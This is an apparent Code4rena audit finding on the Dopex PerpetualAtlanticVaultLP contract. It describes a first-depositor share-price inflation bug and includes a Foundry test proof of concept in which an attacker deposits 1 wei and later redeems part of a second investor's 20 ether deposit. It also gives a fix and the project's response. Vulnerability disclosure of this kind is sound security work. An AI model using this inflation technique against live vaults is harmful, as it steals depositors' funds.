---
# Core Classification
protocol: Dopex
chain: everychain
category: uncategorized
vulnerability_type: first_depositor_issue

# Attack Vector Details
attack_type: first_depositor_issue
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 29471
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2023-08-dopex
source_link: https://code4rena.com/reports/2023-08-dopex
github_link: https://github.com/code-423n4/2023-08-dopex-findings/issues/863

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:
  - first_depositor_issue

# Audit Details
report_date: unknown
finders_count: 18
finders:
  - okolicodes
  - IceBear
  - GangsOfBrahmin
  - catellatech
  - ravikiranweb3
---

## Vulnerability Title

[M-09]  A malicious early depositor can manipulate the `LP-Token` price per share to take an unfair share of future user deposits

### Overview


A bug has been identified in the `PerpetualAtlanticVaultLP` contract of the Dopex project. This bug allows a malicious early depositor to profit from future depositors' deposits, while the late depositors will lose part of their funds to the attacker. This is possible because the `addRDPX` function in the contract updates the `_rdpxCollateral` and the `rdpx Token` has 18 decimals. This means that even a small amount of rdpx token results in a higher `totalVaultCollateral()`, and this in turn makes the shares very expensive for the next depositors.

To demonstrate the bug, a test was written and added to the `/tests/perp-vault/Integration.t.sol` file, and then run with the Foundry tool.

The recommendation to prevent this bug is to consider requiring a minimal amount of share tokens to be minted for the first minter. The Dopex project has acknowledged the bug and commented that they have planned to be the first depositors for this vault in order to prevent this issue. The severity of the bug has been assessed as Medium by Alex the Entreprenerd (Judge).

### Original Finding Content


<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118> 

<https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L283>

A  malicious early depositor can profit from future depositors' deposits. While the late depositors will lose part of their funds to the attacker.

### Vulnerability Details

The first depositor can buy a small number of shares and next he should wait until   owner  settle an options through `RdpxCore` so it will result in calling `addRDPX` in `PerpetualAtlanticVaultLP` by transfering rdpxTokens into it and updating `_rdpxCollateral`, as `rdpx Token` has 18 decimals `https://arbiscan.io/token/0x32eb7902d4134bf98a28b963d26de779af92a212` even small amount of rdpx token result in giving a higher `totalVaultCollateral()` so then it calculates `assets.mulDivDown(supply,totalVaultCollateral);` , then it  will make shares very expensive for the next depositors,

### POC

`copy this test into  /tests/perp-vault/Integration.t.sol`<br>
`forge test --match-path  ./tests/perp-vault/Integration.t.sol   -vvvv`

```js
 function test_second_user_loss_share() external {
  //=============================
  address  hecer  = makeAddr("Hecer");
  address  investor = makeAddr("investor");
  //=============================

 setApprovals(hecer);
 setApprovals(investor);

    mintWeth(1 wei, hecer); // hecker starts with 1 wei 🐱‍👤
    mintWeth(20 ether, investor);
 
 
 console.log("WETH Balance Of attacker before " , weth.balanceOf(hecer));          
   console.log("RDPX Balance Of attacker before " ,rdpx.balanceOf(hecer));
    deposit(1 wei, hecer);

    //===============================================================================================================
    /* This step isn't possible like this owner should call  `settle` in RdpxV2Core , but for the simplicity lets say
        10 rdpx tokens transfered into vaultLP   after hecer deposit 1 wei of weth and get 1 share 
    */ 
    deal(address(rdpx),address(vaultLp),10 ether);  // 10 tokens because rpdx 18 decimals // 0x32eb7902d4134bf98a28b963d26de779af92a212 
    vm.prank(address(vault));
    vaultLp.addRdpx(10 ether);
//===============================================================================================================
//   Then the investor deposits  20 ether 
    deposit(20 ether, investor);
    
    uint256 userBalance = vaultLp.balanceOf(hecer);
    uint256 userBalance2 = vaultLp.balanceOf(investor);
    console.log("Lp-balance Of attacker : %s share " , userBalance);
    console.log("Lp-balance Of investor : %s share " , userBalance2);
          // (uint asset , uint rdpxA)= vaultLp.redeemPreview(uint256(1));
    vm.prank(hecer);
    vaultLp.redeem(uint256(1),hecer,hecer);

   console.log("WETH Balance Of attacker after" , weth.balanceOf(hecer));  //Starting with 1wei attacker🐱‍👤 endUp with 2 wrapped ether ;    
   console.log("RDPX Balance Of attacker after" ,rdpx.balanceOf(hecer));        
  }

```

### Tools used

 Foundry

### Recommendation

Consider requiring a minimal amount of share tokens to be minted for the first minter

**[witherblock (Dopex) acknowledged and commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/863#issuecomment-1734043995):**
 > We have planned to be the first depositors for this vault to prevent this issue.

**[Alex the Entreprenerd (Judge) commented](https://github.com/code-423n4/2023-08-dopex-findings/issues/863#issuecomment-1759179100):**
 > Given the fact that:
> - Rebase is possible (good old ERC4626 attack)
> - Impact is existant
> - Deployment is Permissioned
> 
> Medium severity seems appropriate.

***



### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Dopex |
| Report Date | N/A |
| Finders | okolicodes, IceBear, GangsOfBrahmin, catellatech, ravikiranweb3, vangrim, MohammedRizwan, Matin, niki, 836541, 0xWagmi, lsaudit, tapir, Hama, zaevlad, Inspecktor, Bauchibred, erebus |

### Source Links

- **Source**: https://code4rena.com/reports/2023-08-dopex
- **GitHub**: https://github.com/code-423n4/2023-08-dopex-findings/issues/863
- **Contest**: https://code4rena.com/reports/2023-08-dopex

### Keywords for Search

`First Depositor Issue`

